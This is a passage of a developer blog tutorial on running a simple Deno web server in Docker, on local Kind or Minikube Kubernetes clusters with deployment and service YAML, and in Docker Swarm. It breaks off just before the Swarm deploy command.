&lt;p&gt;I built a simple app using Deno.  Mostly because Deno is cool and this primarily a javascript blog.  You can use node too, the app code isn't going to be the biggest focus.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Deno&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`Started on port &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;}`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;httpConnection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Deno&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;serveHttp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;requestEvent&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;httpConnection&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="nx"&gt;requestEvent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;respondWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`Hello for Application!`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;status&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;header&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text/plain&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}))&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;connection&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Deno is super simple, don't even need a single import for this.&lt;/p&gt;

&lt;p&gt;You can run it with &lt;code&gt;deno run --allow-all --unstable app/server.js&lt;/code&gt;.  If you haven't used deno &lt;code&gt;--allow-all&lt;/code&gt; means we're allowing all permissions which are naturally restricted unlike node.  Really &lt;code&gt;--allow-net&lt;/code&gt; is better but for a little test project &lt;code&gt;--allow-all&lt;/code&gt; covers the bases so you don't need to fiddle with it if you use more.  &lt;code&gt;--unstable&lt;/code&gt; is because there's a few unstable things in deno that this depends on.  Hopefully that gets taken care of soon.  &lt;/p&gt;

&lt;p&gt;Once running you should be able to hit it one port 8080.&lt;/p&gt;

&lt;p&gt;At this point I will start making scripts for all my steps so that I can run them without remembering all the flags and stuff. I typically do this as shell scripts which are a little weird to use on Windows.  If you have git installed (and I don't know why anyone reading this wouldn't) you can add &lt;code&gt;C:\Program Files\Git\bin&lt;/code&gt; to your path, which lets you use &lt;code&gt;sh&lt;/code&gt;.  But if you are a Powershell user that probably works too, or WSL.  The point is to start building these steps up.  I also sometimes use a package.json to run them as scripts because that's actually a really handy feature even if I don't need node.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#running-an-application-in-docker"&gt;
  &lt;/a&gt;
  Running an application in Docker
&lt;/h1&gt;

&lt;p&gt;We can run the app.  Now let's run the app in a container.  First we need a dockerfile:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; denoland/deno&lt;/span&gt;

&lt;span class="k"&gt;ADD&lt;/span&gt;&lt;span class="s"&gt; . .&lt;/span&gt;

&lt;span class="k"&gt;CMD&lt;/span&gt;&lt;span class="s"&gt; ["deno", "run", "--allow-all", "--unstable", "app/server.js"]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line says we're inheriting from the denoland/deno image which as you might expect contains deno (it's the official image and it's base OS is Debian Linux if you're wondering).  These name refer to images on &lt;a href="https://hub.docker.com/"&gt;dockerhub&lt;/a&gt; by default.  If you are using node or something else find one of the official images there and replace the name.&lt;/p&gt;

&lt;p&gt;The second line say we're going to copy things from the host's current working directory (".") to the current working directory inside the container (you can change the paths if necessary).&lt;/p&gt;

&lt;p&gt;The last line is the command that is run when you start the container.  You can use a string but the array format is preferred as it doesn't go through the shell.  All we're doing is the same command we used to run the server on the outside.&lt;/p&gt;

&lt;p&gt;Now let's build our image.  &lt;code&gt;docker build -f docker/app.dockerfile -t my-app .&lt;/code&gt; where "docker/app.dockerfile" is the path to the dockerfile (it will use &lt;code&gt;./dockerfile&lt;/code&gt; by default) and "my-app" is the name or tag you want to give the image.  I highly recommend you tag the images otherwise you have to look them up when you want to delete them.&lt;/p&gt;

&lt;p&gt;If docker is installed and running it will download some stuff and build the container.  At this point I'd recommend using the official docker extension for vscode if you are using vscode like me.  Otherwise you'll need to learn some more docker commands to list images and running containers.  Once we have the image we can then launch a container.  A container is really just a light-weight VM.  I say "light-weight" but they're still a couple hundred megabytes so you may wish to clean up after yourself.  To run it use &lt;code&gt;docker run -p 8080:8080 --name my-app -it my-app&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;"--name my-app" is the name of the container "my-app" at the end is the name you gave the image you wish to build.  "-it" means you want to get the terminal output and interact with the process, this is technically optional.  &lt;code&gt;-p 8080:8080&lt;/code&gt; is how the host port connects to the container port.  The left is the host, the right is the container, so we're just passing though port 8080.&lt;/p&gt;

&lt;p&gt;At this point you should see the same running output and be able to hit localhost:8080 in the browser and get the same result, this time it's in a container and we can move this container anywhere you want and it will still work as long as you have docker.&lt;/p&gt;

&lt;p&gt;Lastly, let's clean it up.  If we make changes we need to remove the running container (as there can't be 2 with the same name).  We may also want to remove the image just to save space.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;docker rm -f my-app&lt;/code&gt; will kill the container.  The &lt;code&gt;-f&lt;/code&gt; is force because we don't care about the state of it, if we did then we might be gentler.  &lt;code&gt;docker image rm my-app&lt;/code&gt; will remove the image.&lt;/p&gt;

&lt;p&gt;Next you can choose one of two tools for running a local cluster.  A "cluster" is basically a kubernetes universe.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setup-a-cluster-with-kind"&gt;
  &lt;/a&gt;
  Setup a cluster with Kind
&lt;/h2&gt;

&lt;p&gt;First we'll start by using Kind as a cluster.  You can get install instructions here: &lt;a href="https://kind.sigs.k8s.io/docs/user/quick-start/#installation"&gt;https://kind.sigs.k8s.io/docs/user/quick-start/#installation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once setup all we need to do is run &lt;code&gt;kind create cluster --name my-app&lt;/code&gt; to create a new cluster.&lt;/p&gt;

&lt;p&gt;Before we can deploy we need the image for "my-app" to be available to the cluster.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;kind load docker-image my-app --name my-app&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The first "my-app" is the image name.  You'll need to have built the image with docker first with the name "my-app".  The &lt;code&gt;--name&lt;/code&gt; "my-app" is the cluster name which is needed to disambiguate, it corresponds to the name when creating the cluster.&lt;/p&gt;

&lt;p&gt;Once you are done with the cluster and want to delete it you use &lt;code&gt;kind delete cluster --name my-app&lt;/code&gt;.  I suggest you do this after each test to make sure you are in a clean state.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setup-a-cluster-with-minikube"&gt;
  &lt;/a&gt;
  Setup a cluster with Minikube
&lt;/h2&gt;

&lt;p&gt;If you don't want kind we could also use minikube which is another way to run Kubernetes clusters locally.  You can find install instructions here: &lt;a href="https://v1-18.docs.kubernetes.io/docs/tasks/tools/install-minikube/"&gt;https://v1-18.docs.kubernetes.io/docs/tasks/tools/install-minikube/&lt;/a&gt;.  &lt;/p&gt;

&lt;p&gt;Starting is easy enough it's just &lt;code&gt;minikube start&lt;/code&gt;.  Deleting is just as east &lt;code&gt;minikube delete&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To get images onto minikube we can use the command &lt;code&gt;minikube image load my-app&lt;/code&gt; where "my-app" is the name of your docker image.  Note: Searching how to do this will bring up a bunch of other ways but this seems to be the latest and easiest way to do it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#build-a-kubernetes-deployment"&gt;
  &lt;/a&gt;
  Build a kubernetes deployment
&lt;/h2&gt;

&lt;p&gt;Oh boy, here we go.  At least the cluster is easy enough to setup. &lt;/p&gt;

&lt;p&gt;Once a cluster is created there's really nothing in it.  We need to create "pods".  Pods are the smallest unit infrastructure in kubernetes.  They represent a co-located set of containers (or just one container in the simple case).  Abstractly they represent one instance of an application.  To create a pod that runs our application we need to dive into some yaml.&lt;/p&gt;

&lt;p&gt;The first sort of resource we'll setup is called a "deployment". A deployment is a group of pods.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="s"&gt;//deployment.yaml&lt;/span&gt;
&lt;span class="na"&gt;apiVersion&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;apps/v1&lt;/span&gt;
&lt;span class="na"&gt;kind&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Deployment&lt;/span&gt;
&lt;span class="na"&gt;metadata&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;app-deploy&lt;/span&gt;
&lt;span class="na"&gt;spec&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;selector&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;matchLabels&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;my-app&lt;/span&gt;
  &lt;span class="na"&gt;template&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;metadata&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;labels&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;my-app&lt;/span&gt;
    &lt;span class="na"&gt;spec&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;containers&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;app&lt;/span&gt;
        &lt;span class="na"&gt;image&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;my-app&lt;/span&gt;
        &lt;span class="na"&gt;imagePullPolicy&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Never&lt;/span&gt;
        &lt;span class="na"&gt;env&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
          &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;MESSAGE&lt;/span&gt;
            &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Hello World&lt;/span&gt;
        &lt;span class="na"&gt;ports&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;containerPort&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;First we start with what's basically an XML schema definition.  Then the "kind" which is the type of resource we're creating.  We can give the deploy metadata which is a bunch of freeform tags.  "spec" is the actual blueprint to build.  Unlike most other resources deployments are done with templates which means we're giving the blueprint for a configuration of a pod rather than the configuration of the pod itself (we could also do the latter with a kind "pod").  This is because we might make many pods with the same blueprint like in an autoscaling environment.  The "selector" is like a CSS selector, we find pods matching the tags (in this case app = "my-app") and update them if they exist.&lt;/p&gt;

&lt;p&gt;Now to describe the pods themselves. Each pod might have metadata as well in this case a name (the same name we select above).  The spec for the pod includes the containers in the pod.  We just have one.  We give it a name and the name of the image (corresponds to the tag or "-t" argument you gave docker).  "imagePullPolicy" tell it we don't want to automatically download the image. Typically you cluster up in the cloud will download images from a registry like dockerhub, but since we're using local images that will fail so we're turning it off.  Lastly is the port which is the port that gets exposed.  By saying containerPort 8080 the container will expose 8080 to the rest of the pod.  As a bonus I've added some "env".  These are environment variable that are given to the pod and one of the simplest ways to pass data in.&lt;/p&gt;

&lt;p&gt;Since we're adding an environment variable it makes sense to read it so I'll update the application slightly (remember to rebuild the images!).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Deno&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`Started on port &lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;httpConnection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Deno&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;serveHttp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;requestEvent&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;httpConnection&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Deno&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;MESSAGE&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nx"&gt;requestEvent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;respondWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; from Application!`&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="na"&gt;status&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="na"&gt;header&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Content-Type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text/plain&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}))&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;connection&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To actually apply this deployment we use &lt;code&gt;kubectl apply -f path/to/deployment.yaml&lt;/code&gt;.  The &lt;code&gt;-f&lt;/code&gt; here means "use this file".  Also important to note that we're describing the state it should be in, 1 pod running our app and kubernetes will try it's best to maintain that. Also keep in mind yaml is whitespace sensitive, if you have errors it might be because things aren't lined-up correctly.&lt;/p&gt;

&lt;p&gt;At this point we have a pod but we can't really do anything with it because it's not accessible.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#build-a-service"&gt;
  &lt;/a&gt;
  Build a service
&lt;/h2&gt;

&lt;p&gt;Pods in kubernetes are ephemeral, they can be created and destroyed each time with random addresses so we need a stable way to reach a group of resources at a specified address.  This is where a service comes into play.  We can add a service to the deployment.yaml.  Yaml lets us declare multiple documents in the same file as long as the documents are delimited with &lt;code&gt;\n---\n&lt;/code&gt;. So like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="s"&gt;//Deployment spec&lt;/span&gt;
&lt;span class="nn"&gt;---&lt;/span&gt;
&lt;span class="s"&gt;//Service spec&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll look at the service spec now.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="na"&gt;apiVersion&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;v1&lt;/span&gt;
&lt;span class="na"&gt;kind&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Service&lt;/span&gt;
&lt;span class="na"&gt;metadata&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;my-app-service&lt;/span&gt;
&lt;span class="na"&gt;spec&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;selector&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;my-app&lt;/span&gt;
  &lt;span class="na"&gt;ports&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;port&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
    &lt;span class="na"&gt;targetPort&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It's a kind "service" with a metadata name.  Should be straightforward enough.  For the spec we select all pods with app=my-app.  The "targetPort" is the port on the pod and "port" is the port that the service is exposed on.  Now inside the cluster &lt;code&gt;8080&lt;/code&gt; will refer to this service, which is pointed at our app pod's port 8080 so we should see the app.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#expose-it-externally"&gt;
  &lt;/a&gt;
  Expose it externally
&lt;/h2&gt;

&lt;p&gt;We have a service which gives us a stable address, now we need to expose it so we can access the service externally. We can do this with port forwarding.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;kubectl port-forward service/my-app-service 8080:8080&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;service/my-app-service&lt;/code&gt; means it's a service with name "my-app-service" which we labeled it above.  Then we say we want to expose it's port 8080 (services could have multiple ports) on external port 8080.&lt;/p&gt;

&lt;p&gt;With this you should be able to visit localhost:8080 and see the application.  In fact, you should be able to see the message "Hello World from Application!" because it's reading the environment variable we gave it.&lt;/p&gt;

&lt;p&gt;This is a very simple passthrough.  For things like load balancing you need something more complicated called an ingress which has to be configured.  I won't be dealing with that today.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging"&gt;
  &lt;/a&gt;
  Debugging
&lt;/h2&gt;

&lt;p&gt;I won't go too deep into debugging but there's a few basic commands to know to help you unstick yourself.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;kubectl get {resource}&lt;/code&gt; - where {resource} is "pods", "service" etc.  This will list out all of that resource in the cluster so you can see what's there (did the service actually get created?).  Specifically you can see if the pods are healthy.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;kubectl describe {resource} {name}&lt;/code&gt; - where name is the name of the resource (you can find it from the get command). This will do a more detailed description of the resource.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;kubectl logs {podName} {containerName}&lt;/code&gt; - You can get the generated {podName} from the get command, the container name is the name of the container as defined in the yaml configuration.  This will dump all the standard console logs produced by the running process.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;kubectl exec {podName} {containerName} -it -- /bin/bash&lt;/code&gt; - This will open a terminal in the container on the pod so you can run commands.  Depending on the Linux version you might need to run "/bin/sh" instead.  Great for running tools like curl to explore the environment. &lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#bonus-docker-swarm"&gt;
  &lt;/a&gt;
  Bonus: Docker Swarm
&lt;/h2&gt;

&lt;p&gt;Kubernetes is fine and all, it's probably what your enterprise-grade company will use but sometimes, just sometimes, you want a simple cloud setup with less complexity and yaml (note there's still some yaml).  For this there's docker swarm.  I'm a bit sad it didn't take off like Kubernetes because at least as a layman in scalable cloud applications I find it to be a lot more elegant and you need 2 less binaries to run it.&lt;/p&gt;

&lt;p&gt;By default swarm is not enabled in docker.  You need to run &lt;code&gt;docker swarm init&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Docker swarm is configured with a &lt;code&gt;docker-compose.yaml&lt;/code&gt; file which similar to the kubernetes deploy.yaml we built (thought far simpler).  It used to be the case that you would use a related tool called "docker-compose" to build environments from these files though much of it is now built-in to docker itself though docker-compose is still hanging around with slightly different use-cases (it can build images before deploying) but it seems mostly obsolete to me because we do the same thing just in 2 steps.  Let's start with a compose file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="s"&gt;//app.docker-compose.yaml&lt;/span&gt;
&lt;span class="na"&gt;version&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;3.8"&lt;/span&gt;

&lt;span class="na"&gt;services&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;my-app&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;image&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;my-app"&lt;/span&gt;
    &lt;span class="na"&gt;environment&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="s"&gt;MESSAGE="Hello Swarm"&lt;/span&gt;
    &lt;span class="na"&gt;ports&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;8080:8080"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It start with a version which is not dissimilar from the kubernetes version and notes what version spec the file conforms to.  Then we list out services which are similar to kubernetes services, it has one or many containers "my-app" using image "my-app" that we built earlier.  We can pass in environment just like kubernetes and we expose container port 8080 on host port 8080.  The latter line does the same thing the service would have done in kubernetes, we setup a direct line from localhost:8080 to the container's port 8080 in one line.&lt;/p&gt;

&lt;p&gt;To deploy it to the docker engine use the command:&lt;/p&gt;

